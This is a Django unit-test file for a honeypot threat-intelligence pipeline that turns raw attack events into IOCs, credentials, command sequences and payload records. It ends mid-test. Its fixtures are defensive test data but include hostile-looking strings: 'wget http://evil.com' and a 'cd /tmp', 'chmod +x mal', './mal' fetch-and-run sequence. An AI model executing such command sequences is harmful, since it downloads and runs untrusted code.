import hashlib
from datetime import datetime, timedelta
from unittest.mock import MagicMock, patch

from django.conf import settings
from django.contrib.auth import get_user_model
from django.core.files.base import ContentFile
from django.utils import timezone

from greedybear.cronjobs.repositories import IocRepository
from greedybear.models import IOC, CommandSequence, Credential, EventStatus, Honeypot, HoneypotPayload, RawEvent, Sensor
from greedybear.process_event import (
    DEFAULT_EXTERNAL_HONEYPOT,
    HONEYPOT_NAME_MAX_LENGTH,
    _link_sensor_honeypots,
    _normalize_raw_event_to_hit,
    _process_array_field,
    _process_commands,
    _process_credentials,
    _process_payload_hashes,
    _process_related_urls,
    _sensor_honeypot_names,
    process_incoming_event,
)
from tests import CustomTestCase, make_api_source, make_sensor, make_user

User = get_user_model()


PATCH_IOCS_FROM_HITS = "greedybear.process_event.iocs_from_hits"
PATCH_IOC_PROCESSOR = "greedybear.process_event.IocProcessor"
PATCH_UPDATE_SCORES = "greedybear.process_event.UpdateScores"
PATCH_GET_ATTACK_TYPE = "greedybear.process_event.get_attack_type"


def make_batch(api_source, task_id="task-proc-1", batch_status="pending"):
    return EventStatus.objects.create(
        api_source=api_source,
        task_id=task_id,
        status=batch_status,
    )


def make_raw_event(batch, sensor, **kwargs):
    defaults = {
        "src_ip": "10.0.0.1",
        "event_type": "ssh",
        "timestamp": timezone.now() - timezone.timedelta(seconds=5),
        "processed": False,
    }
    defaults.update(kwargs)
    return RawEvent.objects.create(batch=batch, sensor=sensor, **defaults)


def make_ioc(name="10.0.0.1"):
    ioc = MagicMock(spec=IOC)
    ioc.name = name
    ioc.related_urls = []
    return ioc


class TestNormalizeRawEventToHit(CustomTestCase):
    def setUp(self):
        self.user = make_user()
        self.api_source = make_api_source(self.user)
        self.sensor = make_sensor(api_source=self.api_source)
        self.batch = make_batch(self.api_source)

    def _raw(self, **kwargs):
        return make_raw_event(self.batch, self.sensor, **kwargs)

    def test_valid_event_returns_dict(self):
        raw = self._raw(src_ip="1.2.3.4")
        result = _normalize_raw_event_to_hit(raw)
        self.assertIsNotNone(result)
        self.assertEqual(result["src_ip"], "1.2.3.4")

    def test_timestamp_in_hit(self):
        ts = timezone.now() - timezone.timedelta(minutes=5)
        raw = self._raw(src_ip="1.2.3.4", timestamp=ts)
        result = _normalize_raw_event_to_hit(raw)
        self.assertIn("@timestamp", result)

    def test_credential_key_added_when_username_and_password(self):
        raw = self._raw(src_ip="1.2.3.4", username="admin", password="secret", protocol="ssh")
        result = _normalize_raw_event_to_hit(raw)
        self.assertIn("_credential", result)
        self.assertEqual(result["_credential"]["username"], "admin")
        self.assertEqual(result["_credential"]["password"], "secret")

    def test_no_credential_key_without_password(self):
        raw = self._raw(src_ip="1.2.3.4", username="admin", password="")
        result = _normalize_raw_event_to_hit(raw)
        self.assertNotIn("_credential", result)

    def test_no_credential_key_without_username(self):
        raw = self._raw(src_ip="1.2.3.4", username="", password="secret")
        result = _normalize_raw_event_to_hit(raw)
        self.assertNotIn("_credential", result)

    def test_related_url_in_hit(self):
        raw = self._raw(src_ip="1.2.3.4", related_url="http://evil.com/payload")
        result = _normalize_raw_event_to_hit(raw)
        self.assertEqual(result["_related_url"], "http://evil.com/payload")

    def test_command_in_hit(self):
        raw = self._raw(src_ip="1.2.3.4", command="wget http://evil.com")
        result = _normalize_raw_event_to_hit(raw)
        self.assertEqual(result["_command"], "wget http://evil.com")

    def test_dest_port_in_hit(self):
        raw = self._raw(src_ip="1.2.3.4", dest_port=22)
        result = _normalize_raw_event_to_hit(raw)
        self.assertEqual(result["dest_port"], 22)

    def test_sensor_object_in_hit(self):
        raw = self._raw(src_ip="1.2.3.4")
        result = _normalize_raw_event_to_hit(raw)
        self.assertEqual(result["_sensor"], raw.sensor)

    def test_protocol_in_hit(self):
        raw = self._raw(src_ip="1.2.3.4", protocol="ssh")
        result = _normalize_raw_event_to_hit(raw)
        self.assertEqual(result["_protocol"], "ssh")

    def test_no_protocol_key_when_empty(self):
        raw = self._raw(src_ip="1.2.3.4", protocol="")
        result = _normalize_raw_event_to_hit(raw)
        self.assertNotIn("_protocol", result)

    def test_cve_id_in_hit(self):
        raw = self._raw(src_ip="1.2.3.4", cve_id="CVE-2021-44228")
        result = _normalize_raw_event_to_hit(raw)
        self.assertEqual(result["_cve_id"], "CVE-2021-44228")

    def test_no_cve_id_key_when_empty(self):
        raw = self._raw(src_ip="1.2.3.4", cve_id="")
        result = _normalize_raw_event_to_hit(raw)
        self.assertNotIn("_cve_id", result)

    def test_payload_hash_in_hit(self):
        raw = self._raw(src_ip="1.2.3.4", payload_hash="a" * 64)
        result = _normalize_raw_event_to_hit(raw)
        self.assertEqual(result["_payload_hash"], "a" * 64)

    def test_no_payload_hash_key_when_empty(self):
        raw = self._raw(src_ip="1.2.3.4", payload_hash="")
        result = _normalize_raw_event_to_hit(raw)
        self.assertNotIn("_payload_hash", result)


class TestProcessCredentials(CustomTestCase):
    def setUp(self):
        Credential.objects.all().delete()
        self.user = make_user(username="cred_user")
        self.api_source = make_api_source(self.user, name="CredSource")
        self.sensor = make_sensor(api_source=self.api_source)
        self.batch = make_batch(self.api_source, task_id="task-cred")
        # Create a real IOC for M2M
        self.ioc = IOC.objects.create(name="10.0.0.1", type="ip")

    def _hit(self, username="admin", password="pass", protocol="ssh"):
        return {"_credential": {"username": username, "password": password, "protocol": protocol}}

    def test_credential_created_and_linked(self):
        _process_credentials(self.ioc, [self._hit()])
        cred = Credential.objects.get(username="admin", password="pass", protocol="ssh")
        self.assertIn(self.ioc, cred.sources.all())

    def test_idempotent_double_call_no_duplicate(self):
        _process_credentials(self.ioc, [self._hit()])
        _process_credentials(self.ioc, [self._hit()])
        self.assertEqual(
            Credential.objects.filter(username="admin", password="pass", protocol="ssh").count(),
            1,
        )

    def test_hit_without_credential_key_skipped(self):
        _process_credentials(self.ioc, [{"src_ip": "1.1.1.1"}])
        self.assertEqual(Credential.objects.count(), 0)

    def test_multiple_credentials_all_linked(self):
        hits = [
            self._hit("root", "toor", "telnet"),
            self._hit("admin", "1234", "http"),
        ]
        _process_credentials(self.ioc, hits)
        self.assertEqual(self.ioc.credentials.count(), 2)

    def test_same_credential_from_multiple_ips(self):
        ioc2 = IOC.objects.create(name="10.0.0.2", type="ip")
        _process_credentials(self.ioc, [self._hit()])
        _process_credentials(ioc2, [self._hit()])
        cred = Credential.objects.get(username="admin")
        self.assertIn(self.ioc, cred.sources.all())
        self.assertIn(ioc2, cred.sources.all())


class TestProcessRelatedUrls(CustomTestCase):
    def setUp(self):
        self.ioc = IOC.objects.create(name="10.0.0.3", type="ip", related_urls=[])

    def _hit(self, url):
        return {"_related_url": url}

    def test_url_added_to_ioc(self):
        _process_related_urls(self.ioc, [self._hit("http://evil.com/malware")])
        self.ioc.refresh_from_db()
        self.assertIn("http://evil.com/malware", self.ioc.related_urls)

    def test_root_path_url_skipped(self):
        _process_related_urls(self.ioc, [self._hit("http://evil.com/")])
        self.ioc.refresh_from_db()
        self.assertEqual(self.ioc.related_urls, [])

    def test_empty_path_url_skipped(self):
        _process_related_urls(self.ioc, [self._hit("http://evil.com")])
        self.ioc.refresh_from_db()
        self.assertEqual(self.ioc.related_urls or [], [])

    def test_duplicate_url_not_added_twice(self):
        url = "http://evil.com/stage2"
        _process_related_urls(self.ioc, [self._hit(url)])
        _process_related_urls(self.ioc, [self._hit(url)])
        self.ioc.refresh_from_db()
        self.assertEqual(self.ioc.related_urls.count(url), 1)

    def test_new_url_appended_to_existing(self):
        self.ioc.related_urls = ["http://evil.com/existing"]
        self.ioc.save()
        _process_related_urls(self.ioc, [self._hit("http://evil.com/new")])
        self.ioc.refresh_from_db()
        self.assertIn("http://evil.com/existing", self.ioc.related_urls)
        self.assertIn("http://evil.com/new", self.ioc.related_urls)

    def test_no_urls_in_hits_no_db_write(self):
        with self.assertNumQueries(0):
            _process_related_urls(self.ioc, [{"src_ip": "1.1.1.1"}])

    def test_urls_sorted_in_db(self):
        _process_related_urls(
            self.ioc,
            [self._hit("http://z.com/z"), self._hit("http://a.com/a")],
        )
        self.ioc.refresh_from_db()
        self.assertEqual(self.ioc.related_urls, sorted(self.ioc.related_urls))


class TestProcessCommands(CustomTestCase):
    def setUp(self):
        super().setUp()
        # enabling isolated test
        CommandSequence.objects.all().delete()

    def _hit(self, cmd):
        return {"_command": cmd}

    def test_command_sequence_created(self):
        _process_commands([self._hit("whoami"), self._hit("id")])
        self.assertEqual(CommandSequence.objects.count(), 1)
        seq = CommandSequence.objects.first()
        self.assertIn("whoami", seq.commands)
        self.assertIn("id", seq.commands)

    def test_duplicate_commands_deduplicated(self):
        _process_commands([self._hit("whoami"), self._hit("whoami")])
        seq = CommandSequence.objects.first()
        self.assertEqual(seq.commands.count("whoami"), 1)

    def test_command_order_preserved(self):
        cmds = ["cd /tmp", "wget http://evil.com", "chmod +x mal", "./mal"]
        _process_commands([self._hit(c) for c in cmds])
        seq = CommandSequence.objects.first()
        self.assertEqual(seq.commands, cmds)

    def test_same_sequence_idempotent(self):
        _process_commands([self._hit("ls")])
        _process_commands([self._hit("ls")])
        self.assertEqual(CommandSequence.objects.count(), 1)

    def test_different_sequences_create_separate_records(self):
        _process_commands([self._hit("ls")])
        _process_commands([self._hit("pwd")])
        self.assertEqual(CommandSequence.objects.count(), 2)

    def test_hash_is_sha256_of_joined_commands(self):
        cmds = ["ls", "pwd"]
        _process_commands([self._hit(c) for c in cmds])
        expected_hash = hashlib.sha256("|".join(cmds).encode()).hexdigest()
        seq = CommandSequence.objects.first()
        self.assertEqual(seq.commands_hash, expected_hash)

    def test_empty_hits_creates_nothing(self):
        _process_commands([{"src_ip": "1.1.1.1"}])
        self.assertEqual(CommandSequence.objects.count(), 0)

    def test_empty_command_string_skipped(self):
        _process_commands([self._hit("")])
        self.assertEqual(CommandSequence.objects.count(), 0)


class TestProcessIncomingEvent(CustomTestCase):
    def setUp(self):
        self.user = make_user(username="proc_int_user")
        self.api_source = make_api_source(self.user, name="ProcIntSource")
        self.sensor = make_sensor(api_source=self.api_source)
        self.batch = make_batch(self.api_source, task_id="task-int-1")

    def _make_raw(self, **kwargs):
        return make_raw_event(self.batch, self.sensor, **kwargs)

    def _mock_ioc(self, name="10.0.0.1"):
        return IOC.objects.create(name=name, type="ip")

    def test_nonexistent_batch_id_returns_early(self):
        """Should not raise; logs error and returns."""
        process_incoming_event(self.api_source.id, task_id=999999)
        # Nothing explodes and batch table is unchanged
        self.assertEqual(EventStatus.objects.filter(task_id=999999).count(), 0)

    def test_empty_raw_events_completes_batch(self):
        process_incoming_event(self.api_source.id, self.batch.task_id)
        self.batch.refresh_from_db()
        self.assertEqual(self.batch.status, "completed")
        self.assertIsNotNone(self.batch.processed_at)

    def test_completed_batch_is_not_reclaimed(self):
        EventStatus.objects.filter(pk=self.batch.pk).update(status="completed", ioc_count=3)

        process_incoming_event(self.api_source.id, self.batch.task_id)

        self.batch.refresh_from_db()
        self.assertEqual(self.batch.status, "completed")
        self.assertEqual(self.batch.ioc_count, 3)
        self.assertIsNone(self.batch.started_at)

    def test_recent_processing_batch_is_skipped(self):
        started_at = datetime.now()
        EventStatus.objects.filter(pk=self.batch.pk).update(status="processing", started_at=started_at)

        process_incoming_event(self.api_source.id, self.batch.task_id)

        self.batch.refresh_from_db()
        self.assertEqual(self.batch.status, "processing")
        self.assertEqual(self.batch.started_at, started_at)

    def test_stale_processing_batch_is_taken_over(self):
        # a worker killed mid-run leaves the batch in PROCESSING; the redelivered task must resume it
        stale = datetime.now() - timedelta(seconds=settings.Q_CLUSTER["timeout"] + 60)
        EventStatus.objects.filter(pk=self.batch.pk).update(status="processing", started_at=stale)

        process_incoming_event(self.api_source.id, self.batch.task_id)

        self.batch.refresh_from_db()
        self.assertEqual(self.batch.status, "completed")
        self.assertGreater(self.batch.started_at, stale)

    def test_processing_batch_without_started_at_is_taken_over(self):
        # batches left in PROCESSING before started_at existed must not stay stuck
        EventStatus.objects.filter(pk=self.batch.pk).update(status="processing", started_at=None)

        process_incoming_event(self.api_source.id, self.batch.task_id)

        self.batch.refresh_from_db()
        self.assertEqual(self.batch.status, "completed")
        self.assertIsNotNone(self.batch.started_at)

    @patch(PATCH_IOCS_FROM_HITS, return_value=[])
    def test_all_raw_events_invalid_sets_failed(self, mock_hits):
        self._make_raw(src_ip="192.168.1.1")

        process_incoming_event(self.api_source.id, self.batch.task_id)
        self.batch.refresh_from_db()
        self.assertEqual(self.batch.status, "failed")

    @patch(PATCH_IOCS_FROM_HITS, return_value=[])
    def test_zero_iocs_from_hits_sets_failed(self, mock_hits):
        self._make_raw(src_ip="1.2.3.4")
        process_incoming_event(self.api_source.id, self.batch.task_id)
        self.batch.refresh_from_db()
        self.assertEqual(self.batch.status, "failed")
        self.assertIn("0 IOCs", self.batch.last_error)

    @patch(PATCH_UPDATE_SCORES)
    @patch(PATCH_GET_ATTACK_TYPE, return_value="scanner")
    @patch(PATCH_IOC_PROCESSOR)
    @patch(PATCH_IOCS_FROM_HITS)
    def test_happy_path_completes_batch(self, mock_hits, mock_processor_cls, mock_attack, mock_scores_cls):
        self._make_raw(src_ip="5.6.7.8")
        saved_ioc = self._mock_ioc("5.6.7.8")

        mock_hits.return_value = [make_ioc("5.6.7.8")]
        processor_instance = MagicMock()
        processor_instance.add_ioc.return_value = saved_ioc
        mock_processor_cls.return_value = processor_instance

        scores_instance = MagicMock()
        mock_scores_cls.return_value = scores_instance

        process_incoming_event(self.api_source.id, self.batch.task_id)

        self.batch.refresh_from_db()
        self.assertEqual(self.batch.status, "completed")
        self.assertEqual(self.batch.ioc_count, 1)
        self.assertIsNotNone(self.batch.processed_at)

    @patch(PATCH_UPDATE_SCORES)
    @patch(PATCH_GET_ATTACK_TYPE, return_value="scanner")
    @patch(PATCH_IOC_PROCESSOR)
    @patch(PATCH_IOCS_FROM_HITS)
    def test_raw_events_marked_processed(self, mock_hits, mock_processor_cls, mock_attack, mock_scores_cls):
        raw = self._make_raw(src_ip="5.6.7.8")
        saved_ioc = self._mock_ioc("5.6.7.8")

        mock_hits.return_value = [make_ioc("5.6.7.8")]
        processor_instance = MagicMock()
        processor_instance.add_ioc.return_value = saved_ioc
        mock_processor_cls.return_value = processor_instance
        mock_scores_cls.return_value = MagicMock()

        process_incoming_event(self.api_source.id, self.batch.task_id)

        raw.refresh_from_db()
        self.assertTrue(raw.processed)

    @patch(PATCH_UPDATE_SCORES)
    @patch(PATCH_GET_ATTACK_TYPE, return_value="scanner")
    @patch(PATCH_IOC_PROCESSOR)
    @patch(PATCH_IOCS_FROM_HITS)
    def test_scoring_called_when_iocs_exist(self, mock_hits, mock_processor_cls, mock_attack, mock_scores_cls):
        self._make_raw(src_ip="5.6.7.8")
        saved_ioc = self._mock_ioc("5.6.7.8")

        mock_hits.return_value = [make_ioc("5.6.7.8")]
        processor_instance = MagicMock()
        processor_instance.add_ioc.return_value = saved_ioc
        mock_processor_cls.return_value = processor_instance

        scores_instance = MagicMock()
        mock_scores_cls.return_value = scores_instance

        process_incoming_event(self.api_source.id, self.batch.task_id)

        scores_instance.score_only.assert_called_once_with([saved_ioc])

    @patch(PATCH_UPDATE_SCORES)
    @patch(PATCH_GET_ATTACK_TYPE, return_value="scanner")
    @patch(PATCH_IOC_PROCESSOR)
    @patch(PATCH_IOCS_FROM_HITS)
    def test_scoring_not_called_when_all_filtered(self, mock_hits, mock_processor_cls, mock_attack, mock_scores_cls):
        """Processor filters every IOC → score_only must not be called."""
        self._make_raw(src_ip="5.6.7.8")

        mock_hits.return_value = [make_ioc("5.6.7.8")]
        processor_instance = MagicMock()
        processor_instance.add_ioc.return_value = None  # filtered
        mock_processor_cls.return_value = processor_instance

        scores_instance = MagicMock()
        mock_scores_cls.return_value = scores_instance

        process_incoming_event(self.api_source.id, self.batch.task_id)

        scores_instance.score_only.assert_not_called()

    @patch(PATCH_IOCS_FROM_HITS, side_effect=RuntimeError("DB exploded"))
    def test_unexpected_exception_sets_failed_and_last_error(self, mock_hits):
        self._make_raw(src_ip="1.2.3.4")
        process_incoming_event(self.api_source.id, self.batch.task_id)
        self.batch.refresh_from_db()
        self.assertEqual(self.batch.status, "failed")
        self.assertIn("DB exploded", self.batch.last_error)

    @patch(PATCH_IOCS_FROM_HITS, side_effect=RuntimeError("crash"))
    def test_processed_at_set_even_on_failure(self, mock_hits):
        """finally block must always set processed_at."""
        self._make_raw(src_ip="1.2.3.4")
        process_incoming_event(self.api_source.id, self.batch.task_id)
        self.batch.refresh_from_db()
        self.assertIsNotNone(self.batch.processed_at)

    @patch(PATCH_IOCS_FROM_HITS, side_effect=RuntimeError("x" * 2000))
    def test_last_error_truncated_to_1000_chars(self, mock_hits):
        self._make_raw(src_ip="1.2.3.4")
        process_incoming_event(self.api_source.id, self.batch.task_id)
        self.batch.refresh_from_db()
        self.assertLessEqual(len(self.batch.last_error), 1000)

    @patch(PATCH_UPDATE_SCORES)
    @patch(PATCH_GET_ATTACK_TYPE, return_value="scanner")
    @patch(PATCH_IOC_PROCESSOR)
    @patch(PATCH_IOCS_FROM_HITS)
    def test_ioc_count_matches_persisted_iocs(self, mock_hits, mock_processor_cls, mock_attack, mock_scores_cls):
        for ip in ("1.1.1.1", "2.2.2.2", "3.3.3.3"):
            self._make_raw(src_ip=ip)
            IOC.objects.create(name=ip, type="ip")

        ioc_objects = [make_ioc(ip) for ip in ("1.1.1.1", "2.2.2.2", "3.3.3.3")]
        mock_hits.return_value = ioc_objects

        processor_instance = MagicMock()
        # Each call returns a different saved IOC
        saved_iocs = [IOC.objects.get(name=ip) for ip in ("1.1.1.1", "2.2.2.2", "3.3.3.3")]
        processor_instance.add_ioc.side_effect = saved_iocs
        mock_processor_cls.return_value = processor_instance
        mock_scores_cls.return_value = MagicMock()

        process_incoming_event(self.api_source.id, self.batch.task_id)

        self.batch.refresh_from_db()
        self.assertEqual(self.batch.ioc_count, 3)

    @patch(PATCH_UPDATE_SCORES)
    @patch(PATCH_IOC_PROCESSOR)
    @patch(PATCH_IOCS_FROM_HITS)
    def test_get_attack_type_classification(self, mock_hits, mock_processor_cls, mock_scores_cls):
        """
        Verify that an IOC with a valid payload URL path is classified as PAYLOAD_REQUEST,
        while an IOC with an empty/root path is classified as a SCANNER.
        """
        self._make_raw(src_ip="1.1.1.1", related_url="http://evil.com/malware.exe")
        self._make_raw(src_ip="2.2.2.2", related_url="http://evil.com/")

        mock_hits.return_value = [make_ioc("1.1.1.1"), make_ioc("2.2.2.2")]

        processor_instance = MagicMock()
        mock_processor_cls.return_value = processor_instance
        mock_scores_cls.return_value = MagicMock()

        process_incoming_event(self.api_source.id, self.batch.task_id)

        calls = processor_instance.add_ioc.call_args_list
        self.assertEqual(len(calls), 2)

        first_call_ioc = calls[0][0][0]
        first_call_type = calls[0][0][1]
        self.assertEqual(first_call_ioc.name, "1.1.1.1")
        self.assertEqual(first_call_type, "payload_request")

        second_call_ioc = calls[1][0][0]
        second_call_type = calls[1][0][1]
        self.assertEqual(second_call_ioc.name, "2.2.2.2")
        self.assertEqual(second_call_type, "scanner")

    def test_processing_or_completed_batch_aborts_immediately(self):
        """
        Ensure that if a batch is already in a 'processing' or 'completed' state,
        the function exits early to prevent concurrent processing race conditions.
        """
        self._make_raw(src_ip="9.9.9.9")

        # Manually shift the status to processing, as a running worker would leave it
        self.batch.status = "processing"
        self.batch.started_at = datetime.now()
        self.batch.save()

        # Execute the function - it should trigger the guard clause and return early
        process_incoming_event(self.api_source.id, self.batch.task_id)

        # Verify that the function exited early without touching the raw events
        # If it had advanced, it would have either failed (since iocs_from_hits isn't mocked here)
        # or processed them. The raw event must remain unprocessed.
        raw_event = RawEvent.objects.filter(batch=self.batch).first()
        self.assertFalse(raw_event.processed)

    @patch(PATCH_IOCS_FROM_HITS)
    @patch("greedybear.process_event.UpdateScores")
    def test_atomic_transaction_rolls_back_on_mid_pipeline_crash(self, mock_scores_cls, mock_hits):
        """
        Ensure that if a crash occurs mid-pipeline (e.g., inside UpdateScores),
        all previous database modifications within the loop are completely rolled back.
        """
        # 1. Setup a real raw event and mock hits to produce a valid IOC
        self._make_raw(src_ip="7.7.7.7")
        mock_hits.return_value = [make_ioc("7.7.7.7")]

        # 2. Force the pipeline to violently crash right at the end of the loop (during Scoring)
        mock_scores_instance = MagicMock()
        mock_scores_instance.score_only.side_effect = RuntimeError("Database connection lost during scoring!")
        mock_scores_cls.return_value = mock_scores_instance

        # 3. Trigger the ingestion processor
        process_incoming_event(self.api_source.id, self.batch.task_id)

        # 4. Assertions:
        self.batch.refresh_from_db()
        # The overall status should be marked as failed due to the exception catch block
        self.assertEqual(self.batch.status, "failed")
        self.assertIn("Database connection lost", self.batch.last_error)

        # ATOMICITY VERIFICATION:
        # Because add_ioc run successfully before the crash, without transaction.atomic,
        # the IOC row would permanently leak into the database.
        # With the transaction block, it must be completely rolled back.
        ioc_exists = IOC.objects.filter(name="7.7.7.7").exists()
        self.assertFalse(ioc_exists, "The IOC record leaked into the database despite a pipeline crash!")

        # The raw event tracking flag should also remain False so it can be retried safely later
        raw_event = RawEvent.objects.filter(batch=self.batch).first()
        self.assertFalse(raw_event.processed)

    @patch("greedybear.process_event._normalize_raw_event_to_hit", return_value={"src_ip": "192.168.1.1"})
    def test_eliminated_raise_all_events_invalid_graceful_return(self, mock_normalize):
        """
        Verifies that when all events fail normalization, the function
        gracefully logs the error in the database without raising a ValueError.
        """
        # Create a raw event so the function doesn't bail early on the empty check
        self._make_raw(src_ip="192.168.1.1")

        try:
            # Execute the function — it should handle the failure without throwing an exception
            process_incoming_event(self.api_source.id, self.batch.task_id)
        except ValueError as exc:
            self.fail(f"process_incoming_event raised a ValueError! {exc}")

        # Refresh state from the database
        self.batch.refresh_from_db()

        # Assert that control flow handled it perfectly
        self.assertEqual(self.batch.status, "failed")

        self.assertEqual(self.batch.ioc_count, 0)


class TestProcessArrayField(CustomTestCase):
    def setUp(self):
        self.ioc = IOC.objects.create(name="10.0.0.4", type="ip", protocols=[], cves=[])

    def _hit(self, hit_key, value):
        return {hit_key: value}

    def test_protocol_added_to_ioc(self):
        _process_array_field(self.ioc, [self._hit("_protocol", "ssh")], hit_key="_protocol", field_name="protocols")
        self.ioc.refresh_from_db()
        self.assertIn("ssh", self.ioc.protocols)

    def test_cve_added_to_ioc(self):
        _process_array_field(self.ioc, [self._hit("_cve_id", "CVE-2021-44228")], hit_key="_cve_id", field_name="cves")
        self.ioc.refresh_from_db()
        self.assertIn("CVE-2021-44228", self.ioc.cves)

    def test_duplicate_value_not_added_twice(self):
        hits = [self._hit("_protocol", "ssh"), self._hit("_protocol", "ssh")]
        _process_array_field(self.ioc, hits, hit_key="_protocol", field_name="protocols")
        self.ioc.refresh_from_db()
        self.assertEqual(self.ioc.protocols.count("ssh"), 1)

    def test_idempotent_double_call_no_duplicate(self):
        _process_array_field(self.ioc, [self._hit("_protocol", "ssh")], hit_key="_protocol", field_name="protocols")
        _process_array_field(self.ioc, [self._hit("_protocol", "ssh")], hit_key="_protocol", field_name="protocols")
        self.ioc.refresh_from_db()
        self.assertEqual(self.ioc.protocols.count("ssh"), 1)

    def test_new_value_appended_to_existing(self):
        self.ioc.protocols = ["telnet"]
        self.ioc.save()
        _process_array_field(self.ioc, [self._hit("_protocol", "ssh")], hit_key="_protocol", field_name="protocols")
        self.ioc.refresh_from_db()
        self.assertIn("telnet", self.ioc.protocols)
        self.assertIn("ssh", self.ioc.protocols)

    def test_multiple_distinct_values_all_added(self):
        hits = [self._hit("_cve_id", "CVE-2021-44228"), self._hit("_cve_id", "CVE-2022-0001")]
        _process_array_field(self.ioc, hits, hit_key="_cve_id", field_name="cves")
        self.ioc.refresh_from_db()
        self.assertEqual(len(self.ioc.cves), 2)

    def test_no_matching_key_in_hits_no_db_write(self):
        with self.assertNumQueries(0):
            _process_array_field(self.ioc, [{"src_ip": "1.1.1.1"}], hit_key="_protocol", field_name="protocols")

    def test_values_sorted_in_db(self):
        hits = [self._hit("_protocol", "telnet"), self._hit("_protocol", "ftp")]
        _process_array_field(self.ioc, hits, hit_key="_protocol", field_name="protocols")
        self.ioc.refresh_from_db()
        self.assertEqual(self.ioc.protocols, sorted(self.ioc.protocols))

    def test_empty_string_value_skipped(self):
        _process_array_field(self.ioc, [self._hit("_protocol", "")], hit_key="_protocol", field_name="protocols")
        self.ioc.refresh_from_db()
        self.assertEqual(self.ioc.protocols, [])


class TestProcessPayloadHashes(CustomTestCase):
    def setUp(self):
        HoneypotPayload.objects.all().delete()
        self.ioc = IOC.objects.create(name="10.0.0.5", type="ip")
        self.sha256 = "a" * 64

    def _hit(self, sha256):
        return {"_payload_hash": sha256}

    def test_stub_payload_created_and_linked(self):
        _process_payload_hashes(self.ioc, [self._hit(self.sha256)])
        payload = HoneypotPayload.objects.get(sha256=self.sha256)
        self.assertIn(self.ioc, payload.iocs.all())

    def test_stub_payload_has_no_file(self):
        _process_payload_hashes(self.ioc, [self._hit(self.sha256)])
        payload = HoneypotPayload.objects.get(sha256=self.sha256)
        self.assertFalse(payload.payload_file)

    def test_idempotent_double_call_no_duplicate_row(self):
        _process_payload_hashes(self.ioc, [self._hit(self.sha256)])
        _process_payload_hashes(self.ioc, [self._hit(self.sha256)])
        self.assertEqual(HoneypotPayload.objects.filter(sha256=self.sha256).count(), 1)

    def test_existing_payload_with_file_not_overwritten(self):
        """If PayloadExtractionJob already quarantined the file, we must not clobber it."""
        existing = HoneypotPayload.objects.create(sha256=self.sha256, md5="deadbeef")
        existing.payload_file.save("sample.bin", ContentFile(b"data"))
        _process_payload_hashes(self.ioc, [self._hit(self.sha256)])
        existing.refresh_from_db()
        self.assertTrue(existing.payload_file)
        self.assertIn(self.ioc, existing.iocs.all())

    def test_multiple_hashes_all_linked(self):
        hits = [self._hit("a" * 64), self._hit("b" * 64)]
        _process_payload_hashes(self.ioc, hits)
        self.assertEqual(self.ioc.payloads.count(), 2)

    def test_same_hash_linked_to_multiple_iocs(self):
        ioc2 = IOC.objects.create(name="10.0.0.6", type="ip")
        _process_payload_hashes(self.ioc, [self._hit(self.sha256)])
        _process_payload_hashes(ioc2, [self._hit(self.sha256)])
        payload = HoneypotPayload.objects.get(sha256=self.sha256)
        self.assertIn(self.ioc, payload.iocs.all())
        self.assertIn(ioc2, payload.iocs.all())

    def test_no_payload_hash_in_hits_no_db_write(self):
        with self.assertNumQueries(0):
            _process_payload_hashes(self.ioc, [{"src_ip": "1.1.1.1"}])

    def test_empty_hash_string_skipped(self):
        _process_payload_hashes(self.ioc, [self._hit("")])
        self.assertEqual(HoneypotPayload.objects.count(), 0)

    def test_uppercase_hash_deduplicates_with_lowercase(self):
        """
        DB-level Lower() constraint must treat the same hash in different
        cases as the same row, no duplicate created.
        """
        _process_payload_hashes(self.ioc, [self._hit("a" * 64)])
        # same hash, uppercase, should find existing row, not create a second
        _process_payload_hashes(self.ioc, [self._hit("A" * 64)])
        self.assertEqual(HoneypotPayload.objects.count(), 1)


class TestSensorHoneypotNames(CustomTestCase):
    def _hit(self, honeypot_software):
        sensor = MagicMock()
        sensor.honeypot_software = honeypot_software
        return {"src_ip": "1.2.3.4", "_sensor": sensor}

    def test_software_returned_verbatim(self):
        self.assertEqual(_sensor_honeypot_names([self._hit("SomeHoneypot")]), ["SomeHoneypot"])

    def test_surrounding_whitespace_stripped(self):
        self.assertEqual(_sensor_honeypot_names([self._hit("  Cowrie  ")]), ["Cowrie"])

    def test_distinct_software_across_sensors_is_collected(self):
        hits = [self._hit("Cowrie"), self._hit("Dionaea"), self._hit("Cowrie")]
        self.assertEqual(_sensor_honeypot_names(hits), ["Cowrie", "Dionaea"])

    def test_blank_software_falls_back_to_external(self):
        names = _sensor_honeypot_names([self._hit(""), self._hit("   ")])
        self.assertEqual(names, [DEFAULT_EXTERNAL_HONEYPOT])

    def test_missing_sensor_falls_back_to_external(self):
        self.assertEqual(_sensor_honeypot_names([{"src_ip": "1.2.3.4"}]), [DEFAULT_EXTERNAL_HONEYPOT])

    def test_long_software_truncated_to_column_width(self):
        """
        The serializer caps honeypot_software, but sensors registered before that
        cap can still hold a longer value, which must not break the batch.
        """
        name = _sensor_honeypot_names([self._hit("a" * 40)])[0]
        self.assertEqual(name, "a" * HONEYPOT_NAME_MAX_LENGTH)


class TestLinkSensorHoneypots(CustomTestCase):
    def setUp(self):
        self.ioc = IOC.objects.create(name="10.0.0.9", type="ip")
        self.repo = IocRepository()

    def _hit(self, honeypot_software):
        sensor = MagicMock()
        sensor.honeypot_software = honeypot_software
        return {"src_ip": self.ioc.name, "_sensor": sensor}

    def test_creates_missing_honeypot_and_links_it(self):
        _link_sensor_honeypots(self.repo, self.ioc, [self._hit("SomeHoneypot")])
        self.assertEqual([hp.name for hp in self.ioc.honeypots.all()], ["SomeHoneypot"])
        self.assertTrue(Honeypot.objects.get(name="SomeHoneypot").active)

    def test_reuses_existing_honeypot(self):
        existing = Honeypot.objects.create(name="Cowrie2", active=True)
        repo = IocRepository()
        _link_sensor_honeypots(repo, self.ioc, [self._hit("Cowrie2")])
        self.assertEqual([hp.pk for hp in self.ioc.honeypots.all()], [existing.pk])
        self.assertEqual(Honeypot.objects.filter(name="Cowrie2").count(), 1)

    def test_links_every_reporting_honeypot(self):
        _link_sensor_honeypots(self.repo, self.ioc, [self._hit("Sshpot"), self._hit("Telnetpot")])
        self.assertEqual(sorted(hp.name for hp in self.ioc.honeypots.all()), ["Sshpot", "Telnetpot"])

    def test_repeated_calls_do_not_duplicate_links(self):
        _link_sensor_honeypots(self.repo, self.ioc, [self._hit("SomeHoneypot")])
        _link_sensor_honeypots(IocRepository(), self.ioc, [self._hit("SomeHoneypot")])
        self.assertEqual(self.ioc.honeypots.count(), 1)

    def test_blank_software_links_external_honeypot(self):
